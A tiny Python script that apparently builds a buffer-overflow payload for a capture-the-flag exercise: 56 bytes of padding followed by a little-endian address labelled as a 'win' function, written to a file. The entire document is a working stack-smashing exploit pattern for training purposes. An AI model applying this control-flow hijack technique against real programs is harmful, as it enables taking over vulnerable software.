#!/usr/bin/env python3

from struct import pack

payload = b'a' * 56

# The address of the function win
payload += pack("<H", 0x2208)

with open("payload", "wb") as f:
    f.write(payload)